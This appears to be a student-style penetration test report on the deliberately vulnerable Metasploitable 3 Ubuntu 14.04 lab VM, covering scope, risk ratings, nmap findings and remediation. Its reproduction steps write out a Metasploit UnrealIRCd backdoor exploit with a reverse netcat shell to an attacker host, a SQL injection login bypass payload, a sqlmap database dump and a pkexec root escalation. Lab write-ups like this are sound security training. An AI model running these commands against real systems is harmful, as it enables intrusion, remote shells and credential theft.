# METASPLOITABLE 3 PENETRATION TEST REPORT

**Mwenda Cybersecurity Consulting, Inc.**

> **Sensitive / Confidential**
> The information in this document is strictly confidential and intended for **Metasploitable 3 — Ubuntu 14.04**.

**CLIENT:** Metasploitable 3 Ubuntu 14.04
**Report Issued:** September 21, 2025

---

## CONFIDENTIALITY STATEMENT, DISCLAIMER & CONTACT INFORMATION

### Confidentiality Statement

This document contains sensitive and confidential information intended solely for Metasploitable 3 Ubuntu 14.04. Unauthorized distribution, copying, or disclosure is strictly prohibited.

### Disclaimer

The penetration test was conducted within a defined scope and time window. While comprehensive, it cannot guarantee that all vulnerabilities were identified.

### Contact Information

**Mwenda Cybersecurity Consulting, Inc.**
Email: [kepha.kariuki@student.moringaschool.com](mailto:kepha.kariuki@student.moringaschool.com)
Website: [www.mwenda-cyber.com](http://www.mwenda-cyber.com)

---

## TABLE OF CONTENTS

* Confidentiality Statement, Disclaimer & Contact Information
* Executive Summary
* Scope
* Methodology
* Risk Ranking
* Findings & Evidence

  * Nmap Findings
  * Exploitation Evidence
  * Privilege Escalation
* Recommendations for Metasploitable Security Posture Improvement
* Steps to Reproduce
* Conclusion
* Bibliography

---

## EXECUTIVE SUMMARY

**Assessment period:** September 20–21, 2025
**Tester:** Kepha Mwenda (Mwenda Cybersecurity Consulting)

Mwenda Cybersecurity Consulting performed a targeted penetration test of the Metasploitable 3 Ubuntu 14.04 VM. The objective was to simulate an external attacker with no prior knowledge and demonstrate the potential impact from initial access through privilege escalation and data discovery.

### Overview

The test uncovered multiple critical security weaknesses that allowed the tester to gain an initial foothold, access plaintext credentials, escalate to root, and extract sensitive files. The vulnerability set included outdated services (UnrealIRCd), web application injection flaws, insecure credential storage, and weak file permissions.

### Critical Findings & Business Impact

* **Open doors to key systems:** Outdated software and exposed services enabled remote command execution.
* **Plain-text passwords and account compromise:** Database credentials were stored and discovered in cleartext.
* **Exposed confidential information:** Sensitive files and hidden data were accessible with limited privileges.

**Business risks include:** data theft, system downtime, and severe reputational damage.

### Urgent Recommendations (summary)

* Patch critical systems immediately (UnrealIRCd, pkexec, etc.).
* Enforce secure credential management (hashing + salting for stored passwords).
* Sanitize and fix web applications to prevent SQL injection.
* Conduct an urgent file-system cleanup and access review.

---

## SCOPE

The assessment was structured to emulate a real-world external attack.

**Boundaries:**

* **Starting point:** Public IP of the target VM only.
* **Target:** Single host (Metasploitable 3 — Ubuntu 14.04) and its exposed services.
* **End goal:** Demonstrate full compromise from initial access to root and discovery of hidden information.

**Out of scope:**

* Any other hosts or network infrastructure outside the VM.
* Denial-of-service testing.
* Actions that would affect other teams, users, or violate lab/CTF rules.

---

## METHODOLOGY

Testing followed **PTES** (Penetration Testing Execution Standard) and incorporated guidance from the **OWASP Security Testing Guide (STG)**. The main phases were:

1. **Intelligence Gathering** — passive and active reconnaissance (nmap, service/version enumeration, file discovery).
2. **Vulnerability Analysis** — identify outdated versions, misconfigurations, and insecure practices.
3. **Exploitation** — use verified exploit modules (Metasploit) and manual techniques (SQL injection) to gain access.
4. **Post-Exploitation** — privilege escalation, data discovery, and evidence collection.

### Tools & Techniques (examples)

* nmap, msfconsole, sqlmap, find, binwalk, exiftool, zlib-flate
* Manual payloads and scripted automation where appropriate

---

## RISK RANKING

Risk assessment is aligned with **NIST SP 800-30**. The table below summarizes key risks.

| FACTOR                              | LIKELIHOOD | IMPACT |
| ----------------------------------- | ---------: | -----: |
| Outdated Service Exploit            |       High |   High |
| Weak Credentials                    |       High |   High |
| Insecure File Storage               |     Medium | Medium |
| Unorthodox Access (port-knock etc.) |        Low |    Low |

### Risk Details

**High Risk** — Outdated services (UnrealIRCd) and weak credentials. Likelihood very high; impact very high. Immediate remediation required.

**Medium Risk** — Insecure file permissions and lack of file integrity. Likelihood high; impact moderate. Prioritize in next patching cycle.

**Low Risk** — Obscure access mechanisms (e.g., port-knocking). Low likelihood due to obscurity; moderate impact if discovered.

### Severity Levels

* **Critical (10):** Immediate threat — remediate immediately.
* **High (7–9):** Urgent — prioritize remediation.
* **Medium (4–6):** Remediate when feasible.
* **Low (1–3):** Note and remediate if possible.
* **Informational (0):** No clear threat but useful context.

---

## FINDINGS & EVIDENCE

### Nmap Findings

After enumeration, the most relevant services identified were:

|     Port | Service (Version)     | Potential Vulnerability                                                |
| -------: | --------------------- | ---------------------------------------------------------------------- |
|   21/tcp | ProFTPD 1.3.5         | Known backdoor / mod_copy issues (CVE-2015-3306)                       |
|   80/tcp | Apache httpd 2.4.7    | Web apps (drupal/, phpmyadmin/) — possible SQLi or weak creds          |
|  445/tcp | Samba smbd 4.3.11     | Potential remote code execution vulnerabilities                        |
| 3306/tcp | MySQL                 | Credentials discovered via other vectors grant DB access               |
| 6697/tcp | UnrealIRCd            | Backdoor vulnerability allows remote command execution (CVE-2010-2075) |
| 8080/tcp | Jetty 8.1.7.v20120910 | Possible vulnerable web apps hosted here                               |

### Exploitation Evidence: Initial Access

1. **UnrealIRCd Backdoor (Port 6697)** — Metasploit module used to send a malicious command to the IRC server, which executed a reverse shell and returned a shell as user `boba_fett`.

2. **SQL Injection (Payroll App, Port 80)** — Manual bypass (`' OR 1=1#`) followed by `sqlmap --dump` extracted the payroll database, revealing plaintext passwords for all users.

3. **Failed Attempts** — ProFTPD and SMB exploit attempts failed due to module incompatibility or protective controls; some HTTP/Jetty attempts failed due to incorrect module selection.

### Exploitation Evidence: Privilege Escalation

* **pkexec vulnerability** was identified and exploited post-compromise. Using the local exploit vector, the tester escalated from `boba_fett` to **root (UID=0)**, confirming full system takeover.

---

## RECOMMENDATIONS FOR METASPLOITABLE SECURITY POSTURE IMPROVEMENT

### Immediate (Critical) Recommendations

* **Patch Management:** Immediately update the OS and all services (UnrealIRCd, pkexec patch, ProFTPD fixes, etc.).
* **Credential Management:** Enforce strong password policies and migrate stored passwords to hashed+salted storage. Revoke and rotate exposed credentials.
* **Web Application Security:** Fix input validation and use parameterized queries. Implement secure coding practices and OWASP controls.

### Strategic (Systemic) Recommendations

* **Defense-in-Depth:** Implement network segmentation, host hardening, application firewalls, and monitoring.
* **Network Hardening:** Disable unnecessary services (IRC, Jetty, Samba if unused) or restrict them to trusted networks.
* **Least Privilege:** Enforce least-privilege for service and user accounts; reduce SUID binaries and review sudoers entries.
* **File System Audit:** Remove or secure any sensitive files in public locations and correct file permissions.

---

## STEPS TO REPRODUCE

### Port & Service Enumeration

**Tool:** nmap
**Command:**

```bash
nmap -p- -sV -sC 10.0.2.15
```

Flags:

* `-p-`: scan all TCP ports 1–65535
* `-sV`: service/version detection
* `-sC`: run default NSE scripts

### Exploitation — UnrealIRCd (Port 6697)

**Tool:** msfconsole

```text
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.0.2.15
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_netcat
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.0.2.20
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
```

Post-exploit: run `whoami` and `id` to confirm access as `boba_fett`.

### Exploitation — SQL Injection (Payroll App)

**Tool:** sqlmap (and manual bypass)

Manual bypass payload in login form:

```
' OR 1=1#
```

Automated dump example:

```bash
sqlmap -u "http://10.0.2.15/payroll_app.php" --dump
```

### Privilege Escalation

* Search for SUID binaries and suspicious setuid paths: `find / -perm -4000 -type f 2>/dev/null`
* Use the pkexec local exploit to escalate to root (apply vendor patches immediately).

### Post-Exploitation File Hunting

* Use `find`, `grep`, and metadata tools (exiftool/binwalk) to locate hidden files, steganographic content, and flags in deep directories (e.g., `.secret_files`, `/opt/`, container filesystems).

---

## CONCLUSION

The Metasploitable 3 Ubuntu 14.04 instance is highly vulnerable and demonstrates how quickly an attacker can move from public-facing services to full system compromise. Immediate remediation actions (patching, credential rotation, and application fixes) are essential to prevent real-world exploitation.

Key priorities:

* Patch vulnerable services and CVEs (UnrealIRCd, pkexec, ProFTPD, etc.).
* Remove or secure unnecessary services.
* Rework web application security and credential storage.

---

## BIBLIOGRAPHY

* NIST SP 800-30
* OWASP Security Testing Guide (STG) & OWASP Top 10
* Metasploit Framework Documentation (Rapid7)
* CVE-2010-2075 (UnrealIRCd backdoor)
* CVE-2015-3306 (ProFTPD mod_copy)
* CVE-2016-2098 (Rails Action Pack inline exec)
* Tools referenced: nmap, msfconsole, sqlmap, binwalk, exiftool, zlib-flate

---

*Report prepared by:* **Kepha Mwenda** — Mwenda Cybersecurity Consulting, Inc.

*End of report.*

